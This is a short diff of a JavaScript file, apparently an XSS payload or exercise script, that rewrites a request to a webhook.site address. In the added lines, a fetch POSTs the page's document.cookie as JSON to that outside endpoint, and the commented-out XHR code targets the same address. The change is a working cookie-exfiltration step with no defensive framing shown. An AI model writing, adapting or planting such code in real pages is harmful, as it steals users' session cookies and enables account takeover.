@@ -7,8 +7,10 @@
 //xhr.open("GET", "https://webhook.site/ed28b5cc-045f-4048-b049-2880871dbaad", true);
 //xhr.withCredentials = true;
 
-fetch('https://webhook.site/ed28b5cc-045f-4048-b049-2880871dbaad', {
-  credentials: 'include',
+fetch("https://webhook.site/ed28b5cc-045f-4048-b049-2880871dbaad", {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({ cookie: document.cookie }),
 });
 
 //xhr.onreadystatechange = function () {
